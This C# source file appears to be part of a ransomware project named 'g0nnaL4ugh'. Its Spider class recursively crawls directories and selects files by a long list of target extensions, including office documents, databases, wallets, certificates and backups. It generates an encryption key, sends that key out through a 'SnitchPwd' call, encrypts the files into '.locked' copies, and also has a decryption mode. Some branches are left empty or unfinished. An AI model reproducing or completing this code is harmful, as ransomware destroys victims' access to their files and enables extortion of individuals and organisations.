using System;
using System.Threading;
using System.Collections.Generic;
#if DEBUG
using System.Diagnostics;
#endif
using System.IO;
using g0nnaL4ugh.Crypto;
using g0nnaL4ugh.Finder;
using g0nnaL4ugh.Snitch;

namespace g0nnaL4ugh
{
	public class TaskObject
	{
		private string filePath;
		private List<Node> db;
		private byte[] pwd;

		public TaskObject(string filePath, List<Node> db, byte[] pwd)
		{
			this.filePath = filePath;
			this.db = db;
			this.pwd = pwd;
		}

		public string FilePath { get { return this.filePath; } }
		public List<Node> Db { get { return this.db; } }
		public byte[] Pwd { get { return this.pwd; } }
	}

	public class Spider
	{
		string[] initialPaths;
		List<Node> nodes;
		Encrypter encrypter;
		Decrypter decrypter;
		private byte[] pwd;

		public Spider(string[] paths, Encrypter encrypter)
		{
			this.initialPaths = paths;
			this.encrypter = encrypter;
			this.nodes = new List<Node>();
		}

		public Spider(string[] paths, Decrypter decrypter, byte[] pwd)
		{
			this.initialPaths = paths;
			this.decrypter = decrypter;
			this.nodes = new List<Node>();
			this.pwd = pwd;
		}

        public Boolean IsValidCipherTextExtension(string ext)
		{
			var validExtensions = new[]
			{
				".locked"
			};
			var i = Array.IndexOf(validExtensions, ext);
            return Array.IndexOf(validExtensions, ext) > -1;
		}

		public Boolean IsValidPlainTextExtension(string ext)
		{
            var validExtensions = new[]
            {
				".txt", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt", "jpeg", ".png", ".csv", ".sql", ".mdb", ".sln", ".php", ".asp", ".aspx", ".html", ".xml", ".psd",
                ".sql", ".mp4", ".7z", ".rar", ".m4a", ".wma", ".avi", ".wmv", ".csv", ".d3dbsp", ".zip", ".sie", ".sum", ".ibank", ".t13", ".t12", ".qdf", ".gdb", ".tax", ".pkpass", ".bc6",
                ".bc7", ".bkp", ".qic", ".bkf", ".sidn", ".sidd", ".mddata", ".itl", ".itdb", ".icxs", ".hvpl", ".hplg", ".hkdb", ".mdbackup", ".syncdb", ".gho", ".cas", ".svg", ".map", ".wmo",
                ".itm", ".sb", ".fos", ".mov", ".vdf", ".ztmp", ".sis", ".sid", ".ncf", ".menu", ".layout", ".dmp", ".blob", ".esm", ".vcf", ".vtf", ".dazip", ".fpk", ".mlx", ".kf", ".iwd", ".vpk",
                ".tor", ".psk", ".rim", ".w3x", ".fsh", ".ntl", ".arch00", ".lvl", ".snx", ".cfr", ".ff", ".vpp_pc", ".lrf", ".m2", ".mcmeta", ".vfs0", ".mpqge", ".kdb", ".db0", ".dba", ".rofl", ".hkx",
                ".bar", ".upk", ".das", ".iwi", ".litemod", ".asset", ".forge", ".ltx", ".bsa", ".apk", ".re4", ".sav", ".lbf", ".slm", ".bik", ".epk", ".rgss3a", ".pak", ".big", "wallet", ".wotreplay",
                ".xxx", ".desc", ".py", ".m3u", ".flv", ".js", ".css", ".rb", ".p7c", ".pk7", ".p7b", ".p12", ".pfx", ".pem", ".crt", ".cer", ".der", ".x3f", ".srw", ".pef", ".ptx", ".r3d", ".rw2", ".rwl",
                ".raw", ".raf", ".orf", ".nrw", ".mrwref", ".mef", ".erf", ".kdc", ".dcr", ".cr2", ".crw", ".bay", ".sr2", ".srf", ".arw", ".3fr", ".dng", ".jpe", ".jpg", ".cdr", ".indd", ".ai", ".eps", ".pdf",
                ".pdd", ".dbf", ".mdf", ".wb2", ".rtf", ".wpd", ".dxg", ".xf", ".dwg", ".pst", ".accdb", ".mdb", ".pptm", ".pptx", ".ppt", ".xlk", ".xlsb", ".xlsm", ".xlsx", ".xls", ".wps", ".docm", ".docx", ".doc",
                ".odb", ".odc", ".odm", ".odp", ".ods", ".odt"
            };
			var i = Array.IndexOf(validExtensions, ext);
			return Array.IndexOf(validExtensions, ext) > -1;
        }
      
        public void BuildNodesFromPath()
        {
            /*
            * Here can be 2 options:
            *  - Encrypt
            *  - Decrypt
            */
            if (this.IsEncryptionMode())
            {
				/* 
				 *  Create password since we are in encryption mode
				 */
				this.pwd = this.encrypter.GenerateRandomPrivateKey();
                string password = Utilities.ConvertBytes2B64(this.pwd);
#if DEBUG
                Sender.FakeSnitchPwd(password);
#else
                Sender.SnitchPwd(password);
#endif
            }
			    
            foreach (string path in this.initialPaths)
            {
#if DEBUG
                Stopwatch watch = new Stopwatch();
                watch.Start();
#endif
                // Console.WriteLine("Processing path: " + path);
                this.ProcessDirectory(path, this.nodes);
#if DEBUG
                Double s = watch.ElapsedMilliseconds / 1000d;
                Console.WriteLine("Time consumed by ProcessDirectory is: {0:N2}s", s);
                watch.Stop();
#endif
            }
        }

        private void ProcessDirectory(string path, List<Node> db)
        {
#if DEBUG
            Console.WriteLine("Processing dir: " + path);
#endif
			string[] files = Directory.GetFiles(path);
            string[] childDirectories = Directory.GetDirectories(path);

            foreach(string filePath in files)
            {
				string ext = Path.GetExtension(filePath);
				TaskObject taskObject = new TaskObject(filePath, db, this.pwd);
				if (this.IsEncryptionMode())
				{
					if (this.IsValidPlainTextExtension(ext))
					{
						var resetEvent = new ManualResetEvent(false);
						ThreadPool.QueueUserWorkItem(
							arg =>
						{
							ProcessFile2EncCallback(taskObject);
							resetEvent.Set();
						});
						resetEvent.WaitOne();
					}
				}else
				{
					if (this.IsValidCipherTextExtension(ext))
					{
						var resetEvent = new ManualResetEvent(false);
                        ThreadPool.QueueUserWorkItem(
                            arg =>
                            {
							    ProcessFile2DesCallback(taskObject);
                                resetEvent.Set();
                            });
                        resetEvent.WaitOne();
					}
				}
            }

            foreach(string dir in childDirectories)
                this.ProcessDirectory(dir, db);

        }
      
		private void ProcessFile2EncCallback(object obj)
		{
            TaskObject taskObject = (TaskObject)obj;
            List<Node> db = taskObject.Db;
            var filePath = taskObject.FilePath;
            byte[] generatedSalt = this.encrypter.GenerateRandomSalt();
            byte[] bytes2Encrypt = File.ReadAllBytes(filePath);
            Node node = new Node(NodeType.File, filePath, generatedSalt);
            db.Add(node);
            byte[] encrypted = this.encrypter.EncryptBytes(
                bytes2Encrypt, taskObject.Pwd, generatedSalt
			);
#if DEBUG
            Writter.WriteBytes2File(encrypted, filePath + ".locked");
            Console.WriteLine("[T: " + Thread.CurrentThread.ManagedThreadId + "] " +
			                  filePath + " | " + Utilities.ConvertBytes2B64(generatedSalt));
            Console.WriteLine("Encrypted bytes: " + Utilities.ConvertBytes2B64(encrypted));
#else
         
#endif
		}

        private void ProcessFile2DesCallback(object obj)
		{
			TaskObject taskObject = (TaskObject)obj;
            List<Node> db = taskObject.Db;
            var filePath = taskObject.FilePath;
			byte[] salt = this.encrypter.GenerateRandomSalt();
			byte[] bytes2Decrypt = File.ReadAllBytes(filePath);
			Node node = new Node(NodeType.File, filePath, salt);
			db.Add(node);
			byte[] plainText = this.decrypter.DecryptBytes(
				bytes2Decrypt, taskObject.Pwd, salt
			);
		}

        private bool IsEncryptionMode()
		{
            /* 
            * We difference the mode of operation by asking if
            * encrypter is not null.
            */
            return this.encrypter != null;
        }
    }
}
